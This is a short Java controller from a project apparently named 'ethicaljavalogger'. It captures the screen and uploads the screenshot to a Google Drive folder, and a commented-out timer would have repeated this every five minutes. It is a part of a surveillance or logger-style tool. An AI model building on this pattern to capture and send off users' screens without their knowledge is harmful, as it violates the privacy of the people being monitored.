package com.mycompany.ethicaljavalogger.controllers;

import com.mycompany.ethicaljavalogger.services.GoogleDriveService;
import com.mycompany.ethicaljavalogger.services.ScreenCaptureService;
import java.io.IOException;
import java.security.GeneralSecurityException;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ScreenCaptureController {
    
    public void handleScreenCapture() {
        try {
            Timer timer = new Timer(true);
            ScreenCaptureService screenCaptureService = new ScreenCaptureService();
            
            String imagePath = screenCaptureService.capture();
            System.out.println(imagePath);
            GoogleDriveService.getInstance().sendMedia(imagePath, GoogleDriveService.getInstance().getImagesFolderId());
            
            
            /*timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
            BufferedImage screen = screenCaptureService.capture();
            }
            }, 0, 5 * 60 * 1000);*/
        } catch (IOException | GeneralSecurityException ex) {
            Logger.getLogger(ScreenCaptureController.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
